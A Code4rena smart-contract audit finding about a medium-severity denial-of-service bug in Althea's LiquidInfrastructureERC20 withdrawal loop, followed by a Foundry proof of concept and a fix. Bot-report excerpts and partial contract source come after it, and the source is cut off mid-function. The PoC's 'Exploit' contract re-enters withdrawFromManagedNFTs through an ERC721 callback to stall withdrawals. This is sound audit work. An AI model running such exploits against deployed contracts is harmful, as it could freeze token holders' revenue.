{
  "Title": "[M-04] Withdrawal from NFTs can be temporarily blocked",
  "Content": "\nIf `nextWithdrawal > ManagedNFTs.length`, the contract won't be able to withdraw revenue from managed NFTs, because `nextWithdrawal` can't reset.\n\n```solidity\n        uint256 limit = Math.min(\n            numWithdrawals + nextWithdrawal,\n            ManagedNFTs.length\n        );\n        uint256 i;\n>>      for (i = nextWithdrawal; i < limit; i++) {\n            LiquidInfrastructureNFT withdrawFrom = LiquidInfrastructureNFT(\n                ManagedNFTs[i]\n            );\n\n            (address[] memory withdrawERC20s, ) = withdrawFrom.getThresholds();\n            withdrawFrom.withdrawBalancesTo(withdrawERC20s, address(this));\n            emit Withdrawal(address(withdrawFrom));\n        }\n        nextWithdrawal = i;\n\n>>      if (nextWithdrawal == ManagedNFTs.length) {\n            nextWithdrawal = 0;\n            emit WithdrawalFinished();\n        }\n```\n\n### Proof of Concept\n\nHow `nextWithdrawal` can become greater than `ManagedNFTs` length? Multiple causes:\n\n- `withdrawFromManagedNFTs` was called for 8 of 10 NFTs, and then 3 NFTs were released.\n- Same as above but malicious user frontruns the NFT release with `withdrawFromManagedNFTs` transaction.\n- This may not be the case in the current implementation but if `transferFrom` will be switched to `safeTransferFrom`, [as bot finding suggests](<https://github.com/code-423n4/2024-02-althea-liquid-infrastructure/blob/main/4naly3er-report.md#l-1-unsafe-erc20-operations>), [here](<https://github.com/code-423n4/2024-02-althea-liquid-infrastructure/blob/main/liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol#L418>),\nthe malicious user can call `withdrawFromManagedNFTs` from the ERC721 callback while `ManagedNFTs` length is not updated.\n\nCoded POC for `onERC721Received` callback reentrancy case:\n\n```solidity\nimport {LiquidInfrastructureERC20, ERC20} from \"../contracts/LiquidInfrastructureERC20.sol\";\nimport {LiquidInfrastructureNFT} from \"../contracts/LiquidInfrastructureNFT.sol\";\nimport {Test} from \"forge-std/Test.sol\";\nimport \"forge-std/console.sol\";\n\ncontract Exploit {\n    LiquidInfrastructureERC20 target;\n    constructor(LiquidInfrastructureERC20 _target) {\n        target = _target;\n    }\n    function onERC721Received(address, address, uint256, bytes memory) public virtual returns (bytes4) {\n        // set counter\n        target.withdrawFromManagedNFTs(2);\n        return this.onERC721Received.selector;\n    }\n}\n\ncontract MockToken is ERC20 {\n    constructor(string memory name, string memory symbol) ERC20(name, symbol) {}\n    function mint(address to, uint256 amount) external {\n        _mint(to, amount);\n    }\n}\n\ncontract C4 is Test {\n    LiquidInfrastructureERC20 liqERC20;\n    MockToken usdc;\n    address alice;\n    address bob;\n    function setUp() public {\n        alice = address(0xa11cE);\n        bob = address(0xb0b);\n        usdc = new MockToken(\"USDC\", \"USDC\");\n        address[] memory rewards = new address[](1);\n        rewards[0] = address(usdc);\n        address[] memory approved = new address[](3);\n        approved[0] = address(this);\n        approved[1] = alice;\n        approved[2] = bob;\n        address[] memory nfts = new address[](3);\n        nfts[0] = address(new LiquidInfrastructureNFT(\"NAME\"));\n        nfts[1] = address(new LiquidInfrastructureNFT(\"NAME\"));\n        nfts[2] = address(new LiquidInfrastructureNFT(\"NAME\"));\n        liqERC20 = new LiquidInfrastructureERC20(\"LIQ\", \"LIQ\", nfts, approved, 10, rewards);\n        for(uint256 i=0; i<nfts.length; i++) {\n            usdc.mint(nfts[i], 1_000_000 * 1e18);\n            LiquidInfrastructureNFT(nfts[i]).setThresholds(rewards, new uint256[](1));\n            LiquidInfrastructureNFT(nfts[i]).transferFrom(address(this), address(liqERC20), 1);\n        }\n    }\n\n    function testWithdrawDOS() public {\n        Exploit exploit = new Exploit(liqERC20);\n        address nft = liqERC20.ManagedNFTs(0);\n        address toRelease1 = liqERC20.ManagedNFTs(1);\n        address toRelease2 = liqERC20.ManagedNFTs(2);\n\n        liqERC20.withdrawFromAllManagedNFTs();\n        assertEq(usdc.balanceOf(address(liqERC20)), 3_000_000 * 1e18);\n        uint256 balBefore = usdc.balanceOf(address(liqERC20));\n        liqERC20.releaseManagedNFT(toRelease2, address(exploit));\n        liqERC20.releaseManagedNFT(toRelease1, alice);\n        // new rewards are ready\n        usdc.mint(nft, 1_000_000 * 1e18);\n        liqERC20.withdrawFromAllManagedNFTs();\n        uint256 balAfter = usdc.balanceOf(address(liqERC20));\n        // 1 mil wasn't withdrawn\n        assertEq(balBefore, balAfter);\n    }\n\n}\n```\n\n### Tools Used\n\nFoundry\n\n### Recommended Mitigation Steps\n\nConsider modifying the check [here](<https://github.com/code-423n4/2024-02-althea-liquid-infrastructure/blob/main/liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol#L382>) to:\n\n```diff\n+       if (nextWithdrawal >= ManagedNFTs.length) {\n            nextWithdrawal = 0;\n            emit WithdrawalFinished();\n        }\n```\n\n### Assessed type\n\nDoS\n\n**[ChristianBorst (Althea) confirmed via duplicate issue #130](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/130#issuecomment-1973797103)**\n\n***\n\n",
  "Impact": "MEDIUM",
  "Source": "https://code4rena.com/reports/2024-02-althea-liquid-infrastructure",
  "Code": [
    {
      "filename": "4naly3er-report.md",
      "content": "# Report\n\n\n## Gas Optimizations\n\n\n| |Issue|Instances|\n|-|:-|:-:|\n| [GAS-1](#GAS-1) | Use assembly to check for `address(0)` | 3 |\n| [GAS-2](#GAS-2) | Using bools for storage incurs overhead | 2 |\n| [GAS-3](#GAS-3) | Cache array length outside of loop | 7 |\n| [GAS-4](#GAS-4) | Use calldata instead of memory for function arguments that do not get mutated | 7 |\n| [GAS-5](#GAS-5) | For Operations that will not overflow, you could use unchecked | 81 |\n| [GAS-6](#GAS-6) | Use Custom Errors | 8 |\n| [GAS-7](#GAS-7) | Don't initialize variables with default value | 7 |\n| [GAS-8](#GAS-8) | Long revert strings | 3 |\n| [GAS-9](#GAS-9) | Functions guaranteed to revert when called by normal users can be marked `payable` | 4 |\n| [GAS-10](#GAS-10) | `++i` costs less gas than `i++`, especially when it's used in `for`-loops (`--i`/`i--` too) | 9 |\n| [GAS-11](#GAS-11) | Using `private` rather than `public` for constants, saves gas | 3 |\n| [GAS-12](#GAS-12) | Use != 0 instead of > 0 for unsigned integer comparison | 4 |\n### <a name=\"GAS-1\"></a>[GAS-1] Use assembly to check for `address(0)`\n*Saves 6 gas per instance*\n\n*Instances (3)*:\n```solidity"
    },
    {
      "filename": "liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol",
      "content": "133:         if (!(to == address(0))) {\n\n139:         if (from == address(0) || to == address(0)) {\n\n139:         if (from == address(0) || to == address(0)) {\n\n```\n\n### <a name=\"GAS-2\"></a>[GAS-2] Using bools for storage incurs overhead\nUse uint256(1) and uint256(2) for true/false to avoid a Gwarmaccess (100 gas), and to avoid Gsset (20000 gas) when changing from ‘false’ to ‘true’, after having been ‘true’ in the past. See [source](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27).\n\n*Instances (2)*:\n```solidity"
    },
    {
      "filename": "liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol",
      "content": "65:     mapping(address => bool) public HolderAllowlist;\n\n80:     bool public LockedForDistribution;\n\n```\n\n### <a name=\"GAS-3\"></a>[GAS-3] Cache array length outside of loop\nIf not cached, the solidity compiler will always read the length of the array during each iteration. That is, if it is a storage array, this is an extra sload operation (100 additional extra gas for each iteration except for the first) and if it is a memory array, this is an extra mload operation (3 additional gas for each iteration except for the first).\n\n*Instances (7)*:\n```solidity"
    },
    {
      "filename": "liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol",
      "content": "171:             for (uint i = 0; i < holders.length; i++) {\n\n220:                 for (uint j = 0; j < distributableERC20s.length; j++) {\n\n271:         for (uint i = 0; i < distributableERC20s.length; i++) {\n\n421:         for (uint i = 0; i < ManagedNFTs.length; i++) {\n\n467:         for (uint i = 0; i < _approvedHolders.length; i++) {\n\n```\n\n```solidity"
    },
    {
      "filename": "liquid-infrastructure/contracts/LiquidInfrastructureNFT.sol",
      "content": "120:         for (uint i = 0; i < newErc20s.length; i++) {\n\n175:         for (uint i = 0; i < erc20s.length; i++) {\n\n```\n\n### <a name=\"GAS-4\"></a>[GAS-4] Use calldata instead of memory for function arguments that do not get mutated\nMark data types as `calldata` instead of `memory` where possible. This makes it so that the data is not automatically loaded into memory. If the data passed into the function does not need to be changed (like updating values in an array), it can be passed in as `calldata`. The one exception to this is if the argument must later be passed into another function that takes an argument that specifies `memory` storage.\n\n*Instances (7)*:\n```solidity"
    },
    {
      "filename": "liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol",
      "content": "442:         address[] memory _distributableERC20s\n\n457:         string memory _name,\n\n458:         string memory _symbol,\n\n459:         address[] memory _managedNFTs,\n\n460:         address[] memory _approvedHolders,\n\n462:         address[] memory _distributableErc20s\n\n```\n\n```solidity"
    },
    {
      "filename": "liquid-infrastructure/contracts/LiquidInfrastructureNFT.sol",
      "content": "63:         string memory accountName\n\n```\n\n### <a name=\"GAS-5\"></a>[GAS-5] For Operations that will not overflow, you could use unchecked\n\n*Instances (81)*:\n```solidity"
    },
    {
      "filename": "liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol",
      "content": "2: pragma solidity 0.8.12; // Force solidity compliance\n\n2: pragma solidity 0.8.12; // Force solidity compliance\n\n4: import \"@openzeppelin/contracts/utils/math/Math.sol\";\n\n4: import \"@openzeppelin/contracts/utils/math/Math.sol\";\n\n4: import \"@openzeppelin/contracts/utils/math/Math.sol\";\n\n4: import \"@openzeppelin/contracts/utils/math/Math.sol\";\n\n5: import \"@openzeppelin/contracts/access/Ownable.sol\";\n\n5: import \"@openzeppelin/contracts/access/Ownable.sol\";\n\n5: import \"@openzeppelin/contracts/access/Ownable.sol\";\n\n6: import \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\n6: import \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\n6: import \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\n6: import \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\n7: import \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\n\n7: import \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\n\n7: import \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\n\n7: import \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\n\n8: import \"@openzeppelin/contracts/token/ERC721/utils/ERC721Holder.sol\";\n\n8: import \"@openzeppelin/contracts/token/ERC721/utils/ERC721Holder.sol\";\n\n8: import \"@openzeppelin/contracts/token/ERC721/utils/ERC721Holder.sol\";\n\n8: import \"@openzeppelin/contracts/token/ERC721/utils/ERC721Holder.sol\";\n\n8: import \"@openzeppelin/contracts/token/ERC721/utils/ERC721Holder.sol\";\n\n9: import \"@openzeppelin/contracts/token/ERC20/extensions/ERC20Burnable.sol\";\n\n9: import \"@openzeppelin/contracts/token/ERC20/extensions/ERC20Burnable.sol\";\n\n9: import \"@openzeppelin/contracts/token/ERC20/extensions/ERC20Burnable.sol\";\n\n9: import \"@openzeppelin/contracts/token/ERC20/extensions/ERC20Burnable.sol\";\n\n9: import \"@openzeppelin/contracts/token/ERC20/extensions/ERC20Burnable.sol\";\n\n10: import \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\n\n10: import \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\n\n10: import \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\n\n11: import \"./LiquidInfrastructureNFT.sol\";\n\n171:             for (uint i = 0; i < holders.length; i++) {\n\n171:             for (uint i = 0; i < holders.length; i++) {\n\n174:                     holders[i] = holders[holders.length - 1];\n\n209:             nextDistributionRecipient + numDistributions,\n\n214:         for (i = nextDistributionRecipient; i < limit; i++) {\n\n214:         for (i = nextDistributionRecipient; i < limit; i++) {\n\n220:                 for (uint j = 0; j < distributableERC20s.length; j++) {\n\n220:                 for (uint j = 0; j < distributableERC20s.length; j++) {\n\n222:                     uint256 entitlement = erc20EntitlementPerUnit[j] *\n\n249:         return (block.number - LastDistribution) >= MinDistributionPeriod;\n\n271:         for (uint i = 0; i < distributableERC20s.length; i++) {\n\n271:         for (uint i = 0; i < distributableERC20s.length; i++) {\n\n275:             uint256 entitlement = balance / supply;\n\n367:             numWithdrawals + nextWithdrawal,\n\n371:         for (i = nextWithdrawal; i < limit; i++) {\n\n371:         for (i = nextWithdrawal; i < limit; i++) {\n\n421:         for (uint i = 0; i < ManagedNFTs.length; i++) {\n\n421:         for (uint i = 0; i < ManagedNFTs.length; i++) {\n\n425:                 ManagedNFTs[i] = ManagedNFTs[ManagedNFTs.length - 1];\n\n467:         for (uint i = 0; i < _approvedHolders.length; i++) {\n\n467:         for (uint i = 0; i < _approvedHolders.length; i++) {\n\n```\n\n```solidity"
    },
    {
      "filename": "liquid-infrastructure/contracts/LiquidInfrastructureNFT.sol",
      "content": "2: pragma solidity 0.8.12; // Force solidity compliance\n\n2: pragma solidity 0.8.12; // Force solidity compliance\n\n4: import \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\n4: import \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\n4: import \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\n4: import \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\n5: import \"@openzeppelin/contracts/token/ERC721/ERC721.sol\";\n\n5: import \"@openzeppelin/contracts/token/ERC721/ERC721.sol\";\n\n5: import \"@openzeppelin/contracts/token/ERC721/ERC721.sol\";\n\n5: import \"@openzeppelin/contracts/token/ERC721/ERC721.sol\";\n\n6: import \"./OwnableApprovableERC721.sol\";\n\n67:                 \"althea://liquid-infrastructure-account/\",\n\n67:                 \"althea://liquid-infrastructure-account/\",\n\n67:                 \"althea://liquid-infrastructure-account/\",\n\n67:                 \"althea://liquid-infrastructure-account/\",\n\n67:                 \"althea://liquid-infrastructure-account/\",\n\n120:         for (uint i = 0; i < newErc20s.length; i++) {\n\n120:         for (uint i = 0; i < newErc20s.length; i++) {\n\n175:         for (uint i = 0; i < erc20s.length; i++) {\n\n175:         for (uint i = 0; i < erc20s.length; i++) {\n\n```\n\n```solidity"
    },
    {
      "filename": "liquid-infrastructure/contracts/OwnableApprovableERC721.sol",
      "content": "2: pragma solidity 0.8.12; // Force solidity compliance\n\n2: pragma solidity 0.8.12; // Force solidity compliance\n\n4: import \"@openzeppelin/contracts/utils/Context.sol\";\n\n4: import \"@openzeppelin/contracts/utils/Context.sol\";\n\n4: import \"@openzeppelin/contracts/utils/Context.sol\";\n\n5: import \"@openzeppelin/contracts/token/ERC721/ERC721.sol\";\n\n5: import \"@openzeppelin/contracts/token/ERC721/ERC721.sol\";\n\n5: import \"@openzeppelin/contracts/token/ERC721/ERC721.sol\";\n\n5: import \"@openzeppelin/contracts/token/ERC721/ERC721.sol\";\n\n```\n\n### <a name=\"GAS-6\"></a>[GAS-6] Use Custom Errors\n[Source](https://blog.soliditylang.org/2021/04/21/custom-errors/)\nInstead of using error strings, to reduce deployment and runtime cost, you should use Custom Errors. This would save both deployment and runtime cost.\n\n*Instances (8)*:\n```solidity"
    },
    {
      "filename": "liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol",
      "content": "107:         require(!isApprovedHolder(holder), \"holder already approved\");\n\n117:         require(isApprovedHolder(holder), \"holder not approved\");\n\n132:         require(!LockedForDistribution, \"distribution in progress\");\n\n199:         require(numDistributions > 0, \"must process at least 1 distribution\");\n\n360:         require(!LockedForDistribution, \"cannot withdraw during distribution\");\n\n431:         require(true, \"unable to find released NFT in ManagedNFTs\");\n\n```\n\n```solidity"
    },
    {
      "filename": "liquid-infrastructure/contracts/LiquidInfrastructureNFT.sol",
      "content": "180:                 require(result, \"unsuccessful withdrawal\");\n\n```\n\n```solidity"
    },
    {
      "filename": "liquid-infrastructure/contracts/OwnableApprovableERC721.sol",
      "content": "40:             revert(\"OwnableApprovable: caller is not owner nor approved\");\n\n```\n\n### <a name=\"GAS-7\"></a>[GAS-7] Don't initialize variables with default value\n\n*Instances (7)*:\n```solidity"
    },
    {
      "filename": "liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol",
      "content": "171:             for (uint i = 0; i < holders.length; i++) {\n\n220:                 for (uint j = 0; j < distributableERC20s.length; j++) {\n\n271:         for (uint i = 0; i < distributableERC20s.length; i++) {\n\n421:         for (uint i = 0; i < ManagedNFTs.length; i++) {\n\n467:         for (uint i = 0; i < _approvedHolders.length; i++) {\n\n```\n\n```solidity"
    },
    {
      "filename": "liquid-infrastructure/contracts/LiquidInfrastructureNFT.sol",
      "content": "120:         for (uint i = 0; i < newErc20s.length; i++) {\n\n175:         for (uint i = 0; i < erc20s.length; i++) {\n\n```\n\n### <a name=\"GAS-8\"></a>[GAS-8] Long revert strings\n\n*Instances (3)*:\n```solidity"
    },
    {
      "filename": "liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol",
      "content": "199:         require(numDistributions > 0, \"must process at least 1 distribution\");\n\n360:         require(!LockedForDistribution, \"cannot withdraw during distribution\");\n\n431:         require(true, \"unable to find released NFT in ManagedNFTs\");\n\n```\n\n### <a name=\"GAS-9\"></a>[GAS-9] Functions guaranteed to revert when called by normal users can be marked `payable`\nIf a function modifier such as `onlyOwner` is used, the function will revert if a normal user tries to pay the function. Marking the function as `payable` will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided.\n\n*Instances (4)*:\n```solidity"
    },
    {
      "filename": "liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol",
      "content": "106:     function approveHolder(address holder) public onlyOwner {\n\n116:     function disapproveHolder(address holder) public onlyOwner {\n\n394:     function addManagedNFT(address nftContract) public onlyOwner {\n\n```\n\n```solidity"
    },
    {
      "filename": "liquid-infrastructure/contracts/LiquidInfrastructureNFT.sol",
      "content": "203:     function recoverAccount() public virtual onlyOwner(AccountId) {\n\n```\n\n### <a name=\"GAS-10\"></a>[GAS-10] `++i` costs less gas than `i++`, especially when it's used in `for`-loops (`--i`/`i--` too)\n*Saves 5 gas per loop*\n\n*Instances (9)*:\n```solidity"
    },
    {
      "filename": "liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol",
      "content": "171:             for (uint i = 0; i < holders.length; i++) {\n\n214:         for (i = nextDistributionRecipient; i < limit; i++) {\n\n220:                 for (uint j = 0; j < distributableERC20s.length; j++) {\n\n271:         for (uint i = 0; i < distributableERC20s.length; i++) {\n\n371:         for (i = nextWithdrawal; i < limit; i++) {\n\n421:         for (uint i = 0; i < ManagedNFTs.length; i++) {\n\n467:         for (uint i = 0; i < _approvedHolders.length; i++) {\n\n```\n\n```solidity"
    },
    {
      "filename": "liquid-infrastructure/contracts/LiquidInfrastructureNFT.sol",
      "content": "120:         for (uint i = 0; i < newErc20s.length; i++) {\n\n175:         for (uint i = 0; i < erc20s.length; i++) {\n\n```\n\n### <a name=\"GAS-11\"></a>[GAS-11] Using `private` rather than `public` for constants, saves gas\nIf needed, the values can be read from the verified contract source code, or if there are multiple values there can be a single getter function that [returns a tuple](https://github.com/code-423n4/2022-08-frax/blob/90f55a9ce4e25bceed3a74290b854341d8de6afa/src/contracts/FraxlendPair.sol#L156-L178) of the values of all currently-public constants. Saves **3406-3606 gas** in deployment gas due to the compiler not having to create non-payable getter functions for deployment calldata, not having to store the bytes of the value outside of where it's used, and not adding another entry to the method ID table\n\n*Instances (3)*:\n```solidity"
    },
    {
      "filename": "liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol",
      "content": "54:     uint256 public constant Version = 1;\n\n```\n\n```solidity"
    },
    {
      "filename": "liquid-infrastructure/contracts/LiquidInfrastructureNFT.sol",
      "content": "46:     uint256 public constant Version = 1;\n\n53:     uint256 public constant AccountId = 1;\n\n```\n\n### <a name=\"GAS-12\"></a>[GAS-12] Use != 0 instead of > 0 for unsigned integer comparison\n\n*Instances (4)*:\n```solidity"
    },
    {
      "filename": "liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol",
      "content": "186:         if (num > 0) {\n\n199:         require(numDistributions > 0, \"must process at least 1 distribution\");\n\n265:         if (erc20EntitlementPerUnit.length > 0) {\n\n```\n\n```solidity"
    },
    {
      "filename": "liquid-infrastructure/contracts/LiquidInfrastructureNFT.sol",
      "content": "178:             if (balance > 0) {\n\n```\n\n\n## Non Critical Issues\n\n\n| |Issue|Instances|\n|-|:-|:-:|\n| [NC-1](#NC-1) | Event is missing `indexed` fields | 7 |\n| [NC-2](#NC-2) | Functions not used internally could be marked external | 9 |\n### <a name=\"NC-1\"></a>[NC-1] Event is missing `indexed` fields\nIndex event fields make the field more quickly accessible to off-chain tools that parse events. However, note that each index field costs extra gas during emission, so it's not necessarily best to index the maximum allowed per event (three fields). Each event should use three indexed fields if there are three or more fields, and gas usage is not particularly of concern for the events in question. If there are fewer than three fields, all of the fields should be indexed.\n\n*Instances (7)*:\n```solidity"
    },
    {
      "filename": "liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol",
      "content": "38:     event Distribution(address recipient, address[] tokens, uint256[] amounts);\n\n41:     event Withdrawal(address source);\n\n43:     event AddManagedNFT(address nft);\n\n44:     event ReleaseManagedNFT(address nft, address to);\n\n```\n\n```solidity"
    },
    {
      "filename": "liquid-infrastructure/contracts/LiquidInfrastructureNFT.sol",
      "content": "34:     event SuccessfulWithdrawal(address to, address[] erc20s, uint256[] amounts);\n\n36:     event SuccessfulRecovery(address[] erc20s, uint256[] amounts);\n\n37:     event ThresholdsChanged(address[] newErc20s, uint256[] newAmounts);\n\n```\n\n### <a name=\"NC-2\"></a>[NC-2] Functions not used internally could be marked external\n\n*Instances (9)*:\n```solidity"
    },
    {
      "filename": "liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol",
      "content": "106:     function approveHolder(address holder) public onlyOwner {\n\n116:     function disapproveHolder(address holder) public onlyOwner {\n\n303:     function mintAndDistribute(\n\n331:     function burnAndDistribute(uint256 amount) public {\n\n344:     function burnFromAndDistribute(address account, uint256 amount) public {\n\n351:     function withdrawFromAllManagedNFTs() public {\n\n394:     function addManagedNFT(address nftContract) public onlyOwner {\n\n413:     function releaseManagedNFT(\n\n441:     function setDistributableERC20s(\n\n```\n\n\n## Low Issues\n\n\n| |Issue|Instances|\n|-|:-|:-:|\n| [L-1](#L-1) | Unsafe ERC20 operation(s) | 3 |\n### <a name=\"L-1\"></a>[L-1] Unsafe ERC20 operation(s)\n\n*Instances (3)*:\n```solidity"
    },
    {
      "filename": "liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol",
      "content": "224:                     if (toDistribute.transfer(recipient, entitlement)) {\n\n418:         nft.transferFrom(address(this), to, nft.AccountId());\n\n```\n\n```solidity"
    },
    {
      "filename": "liquid-infrastructure/contracts/LiquidInfrastructureNFT.sol",
      "content": "179:                 bool result = IERC20(erc20).transfer(destination, balance);\n\n```\n\n\n## Medium Issues\n\n\n| |Issue|Instances|\n|-|:-|:-:|\n| [M-1](#M-1) | Centralization Risk for trusted owners | 9 |\n### <a name=\"M-1\"></a>[M-1] Centralization Risk for trusted owners\n\n#### Impact:\nContracts have owners with privileged rights to perform admin tasks and need to be trusted to not perform malicious updates or drain funds.\n\n*Instances (9)*:\n```solidity"
    },
    {
      "filename": "liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol",
      "content": "32:     Ownable,\n\n106:     function approveHolder(address holder) public onlyOwner {\n\n116:     function disapproveHolder(address holder) public onlyOwner {\n\n306:     ) public onlyOwner {\n\n321:     ) public onlyOwner nonReentrant {\n\n394:     function addManagedNFT(address nftContract) public onlyOwner {\n\n416:     ) public onlyOwner nonReentrant {\n\n443:     ) public onlyOwner {\n\n463:     ) ERC20(_name, _symbol) Ownable() {\n\n```"
    },
    {
      "filename": "liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol",
      "content": "//SPDX-License-Identifier: Apache-2.0\npragma solidity 0.8.12; // Force solidity compliance\n\nimport \"@openzeppelin/contracts/utils/math/Math.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC721/utils/ERC721Holder.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/extensions/ERC20Burnable.sol\";\nimport \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\nimport \"./LiquidInfrastructureNFT.sol\";\n\n/**\n * @title Liquid Infrastructure ERC20\n * @author Christian Borst <christian@althea.systems>\n *\n * @dev An ERC20 contract used to earn rewards from managed LiquidInfrastructreNFTs.\n *\n * A LiquidInfrastructureNFT typically represents some form of infrastructure involved in an Althea pay-per-forward network\n * which frequently receives payments from peers on the network for performing an automated service (e.g. providing internet).\n * This LiquidInfrastructureERC20 acts as a convenient aggregation layer to enable dead-simple investment in real-world assets\n * with automatic revenue accrual. Simply by holding this ERC20 owners are entitled to revenue from the network represented by the token.\n *\n * Revenue is gathered from managed LiquidInfrastructureNFTs by the protocol and distributed to token holders on a semi-regular basis,\n * where there is a minimum number of blocks required to elapse before a new payout to token holders.\n *\n * Minting and burning of this ERC20 is restricted if the minimum distribution period has elapsed, and it is reenabled once a new distribution is complete.\n */\ncontract LiquidInfrastructureERC20 is\n    ERC20,\n    ERC20Burnable,\n    Ownable,\n    ERC721Holder,\n    ReentrancyGuard\n{\n    event Deployed();\n    event DistributionStarted();\n    event Distribution(address recipient, address[] tokens, uint256[] amounts);\n    event DistributionFinished();\n    event WithdrawalStarted();\n    event Withdrawal(address source);\n    event WithdrawalFinished();\n    event AddManagedNFT(address nft);\n    event ReleaseManagedNFT(address nft, address to);\n\n    address[] private distributableERC20s;\n    uint256[] private erc20EntitlementPerUnit;\n    address[] private holders;\n\n    /**\n     * @notice This is the current version of the contract. Every update to the contract will introduce a new\n     * version, regardless of anticipated compatibility.\n     */\n    uint256 public constant Version = 1;\n\n    /**\n     * @notice This collection holds the managed LiquidInfrastructureNFTs which periodically generate revenue and deliver\n     * the balances to this contract.\n     */\n    address[] public ManagedNFTs;\n\n    /**\n     * @notice This collection holds the whitelist for accounts approved to hold the LiquidInfrastructureERC20\n     */\n    mapping(address => bool) public HolderAllowlist;\n\n    /**\n     * @notice Holds the block of the last distribution, used for limiting distribution lock ups\n     */\n    uint256 public LastDistribution;\n\n    /**\n     * @notice Holds the minimum number of blocks required to elapse before a new distribution can begin\n     */\n    uint256 public MinDistributionPeriod;\n\n    /**\n     * @notice When true, locks all transfers, mints, and burns until the current distribution has completed\n     */\n    bool public LockedForDistribution;\n\n    /**\n     * @dev Holds the index into `holders` of the next account owed the current distribution\n     */\n    uint256 internal nextDistributionRecipient;\n\n    /**\n     * @dev Holds the index into `ManagedNFTs` of the next contract to withdraw funds from\n     */\n    uint256 private nextWithdrawal;\n\n    /**\n     * Indicates if the account is approved to hold the ERC20 token or not\n     * @param account the potential holder of the token\n     */\n    function isApprovedHolder(address account) public view returns (bool) {\n        return HolderAllowlist[account];\n    }\n\n    /**\n     * Adds `holder` to the list of approved token holders. This is necessary before `holder` may receive any of the underlying ERC20.\n     * @notice this call will fail if `holder` is already approved. Call isApprovedHolder() first to avoid mistakes.\n     *\n     * @param holder the account to add to the allowlist\n     */\n    function approveHolder(address holder) public onlyOwner {\n        require(!isApprovedHolder(holder), \"holder already approved\");\n        HolderAllowlist[holder] = true;\n    }\n\n    /**\n     * Marks `holder` as NOT approved to hold the token, preventing them from receiving any more of the underlying ERC20.\n     *\n     * @param holder the account to add to the allowlist\n     */\n    function disapproveHolder(address holder) public onlyOwner {\n        require(isApprovedHolder(holder), \"holder not approved\");\n        HolderAllowlist[holder] = false;\n    }\n\n    /**\n     * Implements the lock during distributions, adds `to` to the list of holders when needed\n     * @param from token sender\n     * @param to  token receiver\n     * @param amount  amount sent\n     */\n    function _beforeTokenTransfer(\n        address from,\n        address to,\n        uint256 amount\n    ) internal virtual override {\n        require(!LockedForDistribution, \"distribution in progress\");\n        if (!(to == address(0))) {\n            require(\n                isApprovedHolder(to),\n                \"receiver not approved to hold the token\"\n            );\n        }\n        if (from == address(0) || to == address(0)) {\n            _beforeMintOrBurn();\n        }\n        bool exists = (this.balanceOf(to) != 0);\n        if (!exists) {\n            holders.push(to);\n        }\n    }\n\n    /**\n     * Implements an additional lock on minting and burning, ensuring that supply changes happen after any potential distributions\n     */\n    function _beforeMintOrBurn() internal view {\n        require(\n            !_isPastMinDistributionPeriod(),\n            \"must distribute before minting or burning\"\n        );\n    }\n\n    /**\n     * Removes `from` from the list of holders when they no longer hold any balance\n     * @param from token sender\n     * @param to  token receiver\n     * @param amount  amount sent\n     */\n    function _afterTokenTransfer(\n        address from,\n        address to,\n        uint256 amount\n    ) internal virtual override {\n        bool stillHolding = (this.balanceOf(from) != 0);\n        if (!stillHolding) {\n            for (uint i = 0; i < holders.length; i++) {\n                if (holders[i] == from) {\n                    // Remove the element at i by copying the last one into its place and removing the last element\n                    holders[i] = holders[holders.length - 1];\n                    holders.pop();\n                }\n            }\n        }\n    }\n\n    /**\n     * Performs a distribution to all of the current holders, which may trigger out of gas errors if there are too many holders\n     */\n    function distributeToAllHolders() public {\n        uint256 num = holders.length;\n        if (num > 0) {\n            distribute(holders.length);\n        }\n    }\n\n    /**\n     * Begins or continues a distribution, preventing transfers, mints, and burns of the token until all rewards have been paid out\n     *\n     * @notice distributions may only begin once every MinDistributionPeriod.\n     *\n     * @param numDistributions the number of distributions to process in this execution\n     */\n    function distribute(uint256 numDistributions) public nonReentrant {\n        require(numDistributions > 0, \"must process at least 1 distribution\");\n        if (!LockedForDistribution) {\n            require(\n                _isPastMinDistributionPeriod(),\n                \"MinDistributionPeriod not met\"\n            );\n            